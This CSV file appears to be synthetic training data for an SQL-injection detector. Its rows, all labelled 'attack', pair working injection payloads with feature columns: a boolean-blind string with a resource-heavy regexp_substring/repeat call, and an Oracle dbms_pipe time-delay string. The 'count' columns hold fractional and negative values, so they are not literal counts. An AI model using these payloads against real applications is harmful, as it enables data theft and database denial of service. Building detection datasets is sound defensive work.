id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7806654284437355,178.29273986816406,49.39424514770508,25.28464126586914,66.96466827392578,0.03650696948170662,55.292884826660156,26.39244270324707,1.0030072927474976,0.2830426096916199,0.15991009771823883,0.3827502131462097,0.15045806765556335,3.6756162643432617,1.9663951396942139,0.2949428856372833,1.1003400087356567,-0.12912911176681519,0.16802848875522614,0.0023730192333459854,5.0318403244018555,7.465269088745117,2.0335121154785156,0.15089786052703857,1.6689549684524536,-0.07764846086502075,-0.055928681045770645,0.5417643785476685,1.1093677282333374,0.33933523297309875,0.1428319811820984,-0.011971160769462585,0.21483652293682098,0.02403726801276207,0.5151495933532715,1.7077597379684448,5.790179252624512,1.0106725692749023,0.6200490593910217,0.003170028328895569,0.24098268151283264,0.27131617069244385,0.05617132410407066,-0.03359920531511307,-0.1281154453754425,0.18223866820335388,-0.011385306715965271,0.08283491432666779,0.08772677183151245,0.07125003635883331,0.06515870243310928,0.12819471955299377,0.03186178207397461,-0.06044222041964531,-0.0373932309448719,0.0783684179186821,0.07013162970542908,0.1313166320323944,-0.1789875328540802,0.13801807165145874,-0.011453554034233093,-0.10880035161972046,0.09947274625301361,2.6628265380859375,0.18426549434661865,0.06207713112235069,0.016302531585097313,-0.1570318192243576,-0.10256653279066086,0.04834761098027229,0.1250564604997635,-0.012993751093745232,-0.07871180772781372,0.07815884053707123,-0.05528640002012253,0.04931476712226868,0.9545338749885559,0.5996544361114502,0.1451193243265152,0.21200650930404663,-0.0010928213596343994,7.090636730194092,0.8501818180084229,0.07423081248998642,0.004974029958248138,0.18629324436187744,-0.02041931450366974,-0.003059063106775284,-0.06934037804603577
GAN_000012,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.797781941264804,173.62277221679688,53.66188430786133,24.627704620361328,64.40970611572266,0.10357022285461426,52.28545379638672,27.648263931274414,1.0045099258422852,0.27605095505714417,0.16906869411468506,0.37726205587387085,0.14745208621025085,3.674668788909912,2.0309271812438965,0.20818990468978882,1.147212266921997,-0.202272430062294,0.1597171574831009,-0.007350713014602661,5.72257661819458,7.401885986328125,2.059969186782837,0.12797744572162628,1.6174495220184326,-0.07567489892244339,-0.02320712059736252,0.598634660243988,1.356567621231079,0.33267608284950256,0.1385292112827301,0.030544310808181763,0.2509188652038574,0.054246291518211365,0.5393152832984924,1.7003551721572876,5.923377990722656,0.9883967638015747,0.5945134162902832,-0.018110200762748718,0.3123285174369812,0.2579548954963684,0.08456061035394669,-0.022340714931488037,-0.16104131937026978,0.09433181583881378,0.08510465174913406,0.05624298378825188,0.10731116682291031,0.10683755576610565,0.038678932934999466,0.11573661863803864,0.10247117280960083,-0.09506382793188095,0.04292994737625122,0.06632275879383087,0.08492046594619751,0.05289197340607643,-0.11939596384763718,0.06082508713006973,-0.028773583471775055,-0.027222808450460434,0.20851892232894897,2.725078582763672,0.13604098558425903,0.07785924524068832,0.01472750585526228,-0.19561156630516052,-0.0735929012298584,0.04498005285859108,0.031684719026088715,-0.05894219130277634,-0.05126034840941429,0.07412116229534149,-0.1024634912610054,-0.049097899347543716,0.9623086452484131,0.610181450843811,0.09337867051362991,0.16777615249156952,0.07919590175151825,6.882110595703125,0.8650014996528625,0.07933113723993301,0.07631102204322815,0.1805601716041565,0.011114142835140228,0.007685597985982895,0.020890675485134125
GAN_000013,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9367564221626714,173.7011260986328,49.374637603759766,25.271095275878906,62.082763671875,0.052670445293188095,56.25316619873047,26.396718978881836,0.9529517889022827,0.26965704560279846,0.1605278104543686,0.3858690857887268,0.145700141787529,3.667696952819824,1.7833985090255737,0.40148890018463135,1.091818928718567,-0.14366011321544647,0.14816905558109283,-0.26790595054626465,6.058823108673096,7.47278356552124,1.738774299621582,0.12724383175373077,1.659159541130066,0.02245470881462097,0.09116756916046143,0.5581038594245911,1.2639282941818237,0.32267633080482483,0.17433863878250122,0.020074263215065002,0.2058066427707672,-0.13397103548049927,0.5161213278770447,1.7960458993911743,6.11962366104126,1.0374140739440918,0.6896407008171082,-0.05470689758658409,0.3416953980922699,0.2540118396282196,0.04572366550564766,-0.009941868484020233,0.0018973201513290405,0.055440954864025116,0.11919151991605759,0.05501068755984306,0.07907839119434357,0.14092372357845306,0.07333387434482574,0.1491428017616272,0.12134222686290741,0.10274990648031235,0.05952533334493637,0.12031568586826324,0.09653760492801666,0.10225921869277954,-0.19068023562431335,0.2009214460849762,0.026237472891807556,-0.040769703686237335,0.04154624789953232,2.7036116123199463,0.3288739025592804,0.08520244061946869,0.0359206460416317,-0.09898164868354797,-0.18849870562553406,-0.007530860602855682,0.07980374991893768,-0.022387126460671425,-0.021357405930757523,-0.03020060807466507,-0.0025181621313095093,0.02221372164785862,0.9026506543159485,0.6075384616851807,0.16571390628814697,0.2284059077501297,0.05683595687150955,7.061278343200684,0.8631480932235718,0.03644745796918869,0.15727315843105316,0.24606512486934662,0.06044686213135719,-0.09240208566188812,0.0843857079744339
GAN_000014,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.799627753046374,170.5226287841797,51.85560607910156,23.88766860961914,70.07310485839844,0.029168810695409775,54.912803649902344,27.44561004638672,0.8439822196960449,0.2786162793636322,0.15595433115959167,0.3790028989315033,0.14722250401973724,3.7018535137176514,2.0322587490081787,0.23668013513088226,1.0568780899047852,-0.28446292877197266,0.12400592863559723,0.09985217452049255,5.487039566040039,7.545177459716797,2.219693422317505,0.21962502598762512,1.652389407157898,-0.1092674508690834,-0.09224068373441696,0.5669704675674438,1.0971354246139526,0.29796019196510315,0.0766647532582283,0.07609032094478607,0.181954026222229,-0.09070669859647751,0.5338870882987976,1.6281459331512451,5.759866237640381,0.9812152981758118,0.6305585503578186,-0.06892537325620651,0.253282755613327,0.32095983624458313,0.05437588319182396,-0.01966371387243271,-0.05458801984786987,0.11594897508621216,0.08917587250471115,0.07540596276521683,0.08186918497085571,0.08363945037126541,0.0727703869342804,0.1611819863319397,0.15225708484649658,-0.14076218008995056,-0.05264119431376457,0.09107024222612381,-0.012408655136823654,0.11563441902399063,-0.17545892298221588,0.15364086627960205,0.02842235565185547,0.04148188233375549,0.09700466692447662,2.5394139289855957,0.1394670009613037,0.10215592384338379,-0.001332535408437252,-0.14441907405853271,-0.12785768508911133,0.07039696723222733,0.02001727744936943,-0.12939603626728058,-0.10878537595272064,-0.011965863406658173,-0.1852646768093109,0.019426431506872177,0.9684233069419861,0.5821675658226013,0.1728186011314392,0.17610347270965576,-0.017741285264492035,6.732731819152832,0.8897278904914856,0.12345558404922485,-0.13720719516277313,0.14488203823566437,-0.05503464117646217,-0.04058524966239929,-0.015778474509716034
GAN_000015,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9136677872425234,174.2243194580078,48.828556060791016,23.456024169921875,58.98704528808594,0.05934790149331093,61.56673812866211,28.08156394958496,1.0732814073562622,0.25860774517059326,0.169825941324234,0.37810832262039185,0.1479310840368271,3.6940243244171143,1.8646671772003174,0.2884146571159363,0.999016284942627,-0.14496120810508728,0.08554112911224365,-0.2485920488834381,5.85436487197876,7.6296610832214355,1.5579851865768433,0.08433856815099716,1.7012816667556763,-0.1587749719619751,-0.05946939066052437,0.5069960355758667,0.7671220898628235,0.285396546125412,0.280626118183136,0.0698985606431961,0.22048787772655487,-0.07850731909275055,0.5502454042434692,1.7205047607421875,5.55680513381958,0.9234311580657959,0.6075701713562012,0.16773800551891327,0.27092859148979187,0.2623922824859619,0.01852843165397644,-0.03351440280675888,-0.038660816848278046,0.2459593415260315,0.07717471569776535,0.0301746167242527,0.06831779330968857,0.10573571920394897,-0.00030587229412049055,0.15301193296909332,0.12076642364263535,-0.0016144514083862305,0.05983157828450203,0.05399428308010101,0.010064590722322464,0.08042778819799423,-0.14723524451255798,0.23661252856254578,0.0654493048787117,-0.010067686438560486,0.16830280423164368,2.5678389072418213,0.3413865268230438,0.06739208102226257,0.03496573120355606,-0.07948340475559235,-0.27154621481895447,-0.09238343685865402,0.1469191312789917,0.11818517744541168,0.012953106313943863,0.014251910150051117,-0.1398959755897522,0.01991371065378189,0.8910669684410095,0.6631371974945068,0.14630697667598724,0.2100076526403427,0.11819057166576385,7.2181291580200195,0.8767185807228088,0.057986628264188766,0.19282066822052002,0.24640245735645294,0.002484995871782303,0.038661304861307144,0.0021117031574249268
GAN_000016,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7236171379480716,168.9550018310547,53.608280181884766,23.262990951538086,66.0439453125,0.13366511464118958,52.158626556396484,27.4439754486084,0.93523770570755,0.30330610275268555,0.17057174444198608,0.38426750898361206,0.15104161202907562,3.711869239807129,1.8641022443771362,0.21214699745178223,1.0216902494430542,-0.25505897402763367,0.1647564023733139,-0.09781955182552338,5.991488456726074,7.096216678619385,1.9425888061523438,0.2118402123451233,1.7065967321395874,-0.07128886878490448,0.042342815548181534,0.5389523506164551,0.9483456015586853,0.3605422377586365,0.0824708491563797,-0.02491438388824463,0.16376017034053802,-0.018877578899264336,0.5133139491081238,1.716991901397705,5.731330871582031,1.0990338325500488,0.7103729248046875,-0.008978817611932755,0.3055759370326996,0.24004004895687103,0.10809331387281418,0.0339135117828846,-0.10713492333889008,0.0796617865562439,-0.0768919289112091,0.08365316689014435,0.0726499930024147,0.10647725313901901,0.07550602406263351,0.11333436518907547,-0.024136900901794434,-0.02301078289747238,0.1073961928486824,-0.07063589990139008,-0.08827322721481323,-0.05411800369620323,-0.0034320205450057983,0.13646772503852844,-0.02978219836950302,-0.13009235262870789,0.19492098689079285,2.5370843410491943,0.09102790057659149,0.07475703954696655,-0.009029778651893139,-0.10997434705495834,-0.10873387008905411,0.08665860444307327,0.16080722212791443,0.12159359455108643,0.07335233688354492,-0.00954291969537735,0.01865137554705143,-0.12396305799484253,0.9193329215049744,0.6589537858963013,0.10477153956890106,0.18394385278224945,0.08729290217161179,6.784595012664795,0.8818504214286804,0.027081578969955444,0.14417555928230286,0.16853147745132446,-0.02889704331755638,-0.004885483533143997,0.07716882228851318
GAN_000017,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,3.896023424065837,173.31532287597656,48.56789016723633,22.958847045898438,62.76815414428711,0.036785680800676346,62.77226638793945,27.977806091308594,0.8983911275863647,0.2819981575012207,0.17556655406951904,0.38505563139915466,0.14856396615505219,3.7761597633361816,1.943258285522461,0.300655335187912,0.9194647073745728,-0.17270386219024658,0.15168385207653046,-0.09902098029851913,6.424361228942871,7.436182022094727,1.7734452486038208,0.10908520966768265,1.567663550376892,-0.09441940486431122,0.019809482619166374,0.4488828480243683,1.260643482208252,0.25780606269836426,0.2699326276779175,-0.11114931851625443,0.2586643695831299,-0.11715514212846756,0.5405083894729614,1.6632823944091797,5.204951763153076,1.124822735786438,0.7493695020675659,0.05911459028720856,0.3211669623851776,0.22112788259983063,0.0024654194712638855,0.05151883885264397,-0.04055483639240265,0.12524202466011047,0.20614758133888245,0.09023644775152206,0.1099727600812912,0.16775192320346832,0.08452623337507248,0.11691275984048843,0.247487872838974,-0.1714075654745102,-0.06332556158304214,0.10259109735488892,0.0343736931681633,0.0655730739235878,-0.21144822239875793,0.3416607677936554,-0.07526279985904694,-0.07030224055051804,0.17278391122817993,2.3165159225463867,0.2946166694164276,0.0789322629570961,-0.004156856797635555,0.07399913668632507,-0.25880706310272217,-0.06181218475103378,0.026361815631389618,-0.012132363393902779,0.052821867167949677,-0.16455110907554626,-0.11931668967008591,-0.13166804611682892,0.8790185451507568,0.6203087568283081,0.1326121836900711,0.23956042528152466,0.006370484828948975,6.047743320465088,0.9309428334236145,0.04207802936434746,0.08566230535507202,0.38166487216949463,0.15890759229660034,-0.12421251833438873,0.057853102684020996
GAN_000018,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8957471723354873,179.45697021484375,45.486141204833984,25.18486976623535,67.43460083007812,0.06420957297086716,60.51822280883789,24.98931884765625,0.8222231864929199,0.2834581434726715,0.1513010412454605,0.380424439907074,0.15066474676132202,3.7568185329437256,2.099475860595703,0.35460972785949707,0.8476448059082031,-0.37987175583839417,0.19027014076709747,-0.11475192755460739,5.575735092163086,7.641700744628906,2.0604376792907715,0.17263281345367432,1.6854168176651,-0.05910957232117653,0.01915896311402321,0.4558838903903961,1.1301648616790771,0.38271233439445496,0.1774042397737503,-0.04942833632230759,0.18182243406772614,-0.1656142622232437,0.4427468776702881,1.7039834260940552,5.924724102020264,0.977871835231781,0.6209561824798584,-0.16215838491916656,0.3065701723098755,0.2792181372642517,-0.12519320845603943,-0.045296184718608856,-0.06868915259838104,0.20804338157176971,0.030576787889003754,0.11142230033874512,0.09045087546110153,0.1481827199459076,0.12101323902606964,0.17731699347496033,0.0013011321425437927,0.09949386864900589,0.1595543622970581,0.20014959573745728,-0.07124605774879456,0.12730327248573303,-0.09316995739936829,0.2621999680995941,0.06951344758272171,0.182817280292511,-0.011773861944675446,2.25412917137146,0.02640429697930813,0.09201990067958832,-0.05214041471481323,0.045986905694007874,-0.07528567314147949,0.12746261060237885,-0.1582798957824707,0.0419231615960598,0.07131849229335785,0.0010779500007629395,-0.009619939140975475,-0.16308677196502686,0.8977746963500977,0.533439040184021,0.23699919879436493,0.13695645332336426,0.03379518538713455,7.175161838531494,0.9317441582679749,0.11432966589927673,-0.02496059238910675,0.07522627711296082,0.06110990419983864,0.20621787011623383,0.2410767823457718
GAN_000019,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.931384407116115,163.70071411132812,48.78679656982422,23.50818634033203,63.101444244384766,0.021205659955739975,61.22727584838867,27.375478744506836,0.8594185709953308,0.27953705191612244,0.1596883237361908,0.3870396018028259,0.1448775827884674,3.712407112121582,1.822916865348816,0.4700814187526703,0.9110653400421143,-0.15200147032737732,0.12566377222537994,-0.23482422530651093,6.590426921844482,8.238900184631348,1.6574153900146484,0.14361119270324707,1.6544800996780396,-0.0433352030813694,0.09325531125068665,0.5560567378997803,0.8798216581344604,0.27420541644096375,0.25154250860214233,0.06896914541721344,0.18840628862380981,-0.32141605019569397,0.5579061508178711,1.7803068161010742,6.013463973999023,1.037216067314148,0.7356936931610107,0.03956063091754913,0.24879096448421478,0.2967614531517029,-0.14482560753822327,0.13300757110118866,0.13636453449726105,0.07220116257667542,0.101649709045887,0.0657186433672905,0.041141707450151443,0.1459375023841858,0.05437667295336723,0.14646536111831665,0.27160364389419556,0.14297306537628174,0.07559128850698471,0.038579776883125305,-0.009977612644433975,0.023655187338590622,-0.20926113426685333,0.2439856231212616,0.2965688705444336,-0.04823950305581093,0.055681318044662476,2.2001969814300537,0.4245426058769226,0.06716959178447723,0.02593543566763401,0.07947582006454468,-0.40021032094955444,-0.05201634019613266,0.043852292001247406,0.10278914868831635,-0.10363052785396576,-0.05292803794145584,-0.04067859426140785,-0.09793062508106232,0.9290226101875305,0.6593498587608337,0.23393234610557556,0.19191652536392212,0.07722789794206619,6.9750566482543945,0.8843297362327576,-0.00028258562088012695,0.0996200367808342,0.3598936200141907,0.06592881679534912,0.03196259215474129,0.0324186235666275
GAN_000020,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.904023771079946,173.92218017578125,47.001243591308594,24.17326545715332,60.42882537841797,0.05255536362528801,57.068485260009766,26.778413772583008,0.9810093641281128,0.2822774052619934,0.1642926186323166,0.38260626792907715,0.14730335772037506,3.692718744277954,1.7315877676010132,0.3605365455150604,0.9928610920906067,-0.10113025456666946,0.15794935822486877,-0.2655221223831177,6.366127014160156,7.310828685760498,1.6297613382339478,0.1247311681509018,1.720053791999817,0.004879310727119446,0.07487916946411133,0.5689566135406494,1.1739033460617065,0.3292417526245117,0.2666833996772766,0.020605191588401794,0.17884555459022522,-0.1723679006099701,0.4987538754940033,1.8629564046859741,6.001119613647461,0.9588504433631897,0.6871054768562317,-0.0067678168416023254,0.32360658049583435,0.26673972606658936,0.033493030816316605,-0.027019433677196503,0.0167129784822464,0.12408313900232315,0.064317487180233,0.043440718203783035,0.08536581695079803,0.12544700503349304,0.049702245742082596,0.16074992716312408,0.06515683233737946,0.10193978995084763,0.07582320272922516,0.11018870770931244,-0.020488087087869644,0.08200216293334961,-0.20357677340507507,0.17142532765865326,0.09026827663183212,0.03337536007165909,0.10408541560173035,2.6985087394714355,0.2958141267299652,0.09280432760715485,0.03008345142006874,-0.03796638548374176,-0.236496239900589,-0.042837537825107574,0.13482949137687683,0.03038182482123375,-0.008512381464242935,-0.050770245492458344,-0.07489114999771118,0.030983250588178635,0.8878412246704102,0.6059613227844238,0.1357584148645401,0.23544661700725555,0.08715907484292984,7.517117023468018,0.8599915504455566,0.0005288198590278625,0.18956443667411804,0.22435262799263,-0.02033785544335842,0.050050120800733566,0.05328468978404999
GAN_000021,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8515789185890097,173.46926879882812,54.555362701416016,24.364046096801758,69.79795837402344,0.1424095332622528,52.597049713134766,27.221147537231445,1.0297319889068604,0.27929604053497314,0.1619514375925064,0.37835630774497986,0.14844448864459991,3.6794533729553223,2.0036261081695557,0.286187082529068,1.1922672986984253,-0.2500506639480591,0.16016212105751038,0.008193152025341988,5.437931060791016,6.898309707641602,2.3349075317382812,0.13092662394046783,1.6787272691726685,-0.10780500620603561,0.002745741745457053,0.6150861978530884,1.1538461446762085,0.3563593029975891,0.12468130141496658,-0.01353958249092102,0.19784677028656006,0.08615577220916748,0.5053226947784424,1.72301185131073,5.152482986450195,0.8255527019500732,0.5776820182800293,-0.07624530792236328,0.2985219657421112,0.29556137323379517,0.11603197455406189,-0.04030445218086243,-0.1068417951464653,0.21067459881305695,0.007173120975494385,0.07296665012836456,0.06517009437084198,0.08961756527423859,0.027397681027650833,0.19190777838230133,0.09944722056388855,-0.10510453581809998,0.023713449016213417,0.15568889677524567,0.10690769553184509,0.0878826454281807,-0.07739464193582535,0.13583311438560486,0.028192490339279175,0.05526607483625412,0.2014971375465393,2.5154569149017334,0.06648655235767365,0.09269455075263977,0.010577636770904064,-0.1912861466407776,-0.12921175360679626,0.05253181234002113,0.016914576292037964,-0.10029284656047821,-0.13943392038345337,-0.037367083132267,-0.12086619436740875,0.043606117367744446,0.9830992221832275,0.5955620408058167,0.1396874189376831,0.12211313843727112,-0.029816031455993652,6.681982040405273,0.8782153129577637,0.18576166033744812,-0.10072767734527588,0.21128974854946136,-0.14680273830890656,0.09069786965847015,-0.02809111773967743
GAN_000022,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8804853553790144,172.4419708251953,49.490482330322266,23.655927658081055,60.920372009277344,0.13290372490882874,55.518341064453125,27.10677719116211,0.9548417329788208,0.2866564691066742,0.16575929522514343,0.3747847080230713,0.14889603853225708,3.7189230918884277,1.6735944747924805,0.21252372860908508,0.9501583576202393,-0.16082262992858887,0.1594482809305191,-0.11842863261699677,6.285177707672119,7.056122779846191,1.7468262910842896,0.17176058888435364,1.65944242477417,0.012240666896104813,0.102740079164505,0.601948618888855,1.1696962118148804,0.3223508298397064,0.2138184905052185,-0.04488641768693924,0.19927261769771576,-0.10289422422647476,0.4904572069644928,1.842947244644165,5.893255233764648,0.9733999371528625,0.6464642286300659,-0.09235282242298126,0.33169689774513245,0.31198403239250183,0.10451661795377731,-0.057236261665821075,-0.04208160936832428,0.029800288379192352,0.02387530356645584,0.06756305694580078,0.09491682052612305,0.10229067504405975,0.08892084658145905,0.1283399909734726,-0.006244249641895294,0.05410720407962799,0.09268813580274582,0.05715017765760422,-0.031187769025564194,0.043648459017276764,-0.21725094318389893,0.24262917041778564,0.03830903023481369,-0.01204826682806015,0.10248585045337677,2.6483492851257324,0.29647523164749146,0.10058140754699707,0.0007219622493721545,-0.09853570908308029,-0.17655162513256073,-0.04931323975324631,0.0872175395488739,-0.03570651262998581,-0.052613627165555954,-0.12413730472326279,-0.0894738957285881,0.012727886438369751,0.8643947839736938,0.5559929013252258,0.08072560280561447,0.24245555698871613,0.04689129441976547,7.462028980255127,0.8711866140365601,0.09947030991315842,0.11775445938110352,0.20019978284835815,-0.08656202256679535,-0.06103386729955673,0.09973739087581635
GAN_000023,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.968542020098539,173.4661865234375,54.25972366333008,22.734878540039062,70.33032989501953,0.12105716019868851,59.67551803588867,26.145179748535156,1.1063941717147827,0.27423495054244995,0.1535213142633438,0.3783181309700012,0.14592023193836212,3.7272489070892334,1.955126166343689,0.39043134450912476,0.9419223070144653,-0.3913545608520508,0.13102960586547852,-0.09942274540662766,5.774806976318359,6.888821601867676,2.081634044647217,0.16720379889011383,1.6688858270645142,-0.17865513265132904,0.03262787684798241,0.5202004313468933,0.6180511116981506,0.2958974838256836,0.2558929920196533,0.14827083051204681,0.17260661721229553,-0.09553365409374237,0.5152678489685059,1.5725563764572144,5.150949954986572,0.7059068083763123,0.5722121596336365,0.047164611518383026,0.2791363298892975,0.31661322712898254,-0.02208174765110016,-0.07363419979810715,-0.14179964363574982,0.1976904273033142,-0.02970518171787262,0.05423024669289589,0.031365539878606796,0.09617923200130463,0.03616282716393471,0.21153460443019867,0.013042062520980835,-0.03934995085000992,0.13560089468955994,0.04279869794845581,-0.016726475208997726,0.019822541624307632,0.11084050685167313,0.19263222813606262,-0.0637504979968071,0.25199148058891296,0.21336936950683594,2.084414005279541,0.06909815967082977,0.10060019791126251,-0.019931921735405922,-0.05723930522799492,-0.14242982864379883,-0.07773203402757645,-0.01642662286758423,0.034077733755111694,-0.11020055413246155,0.05307450890541077,-0.06614065915346146,-0.019977230578660965,0.8702936172485352,0.5945952534675598,0.19086837768554688,0.08504270762205124,0.03156379237771034,6.610105991363525,0.9105713367462158,0.15970933437347412,-0.10017326474189758,0.19222992658615112,-0.023374423384666443,0.2587191164493561,0.10711647570133209
